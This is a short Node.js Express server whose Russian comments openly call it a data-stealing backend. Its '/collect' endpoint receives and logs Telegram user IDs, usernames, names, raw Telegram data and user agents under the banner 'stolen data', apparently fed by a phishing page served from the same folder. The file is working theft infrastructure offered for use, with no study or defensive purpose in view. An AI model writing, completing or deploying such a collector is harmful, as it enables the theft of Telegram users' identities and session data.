const express = require('express');
const app = express();

app.use(express.json());

// Раздаём статику из корня
app.use(express.static(__dirname));

// Главная страница
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// endpoint для кражи данных
app.post('/collect', (req, res) => {
    console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
    console.log('User ID:', req.body.user_id);
    console.log('Username:', req.body.username);
    console.log('Name:', req.body.first_name, req.body.last_name);
    console.log('Telegram Data:', req.body.telegram_data);
    console.log('User Agent:', req.body.user_agent);
    console.log('Timestamp:', req.body.timestamp);
    console.log('========================');
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Сервер крадёт данные на порту ${PORT}`);
});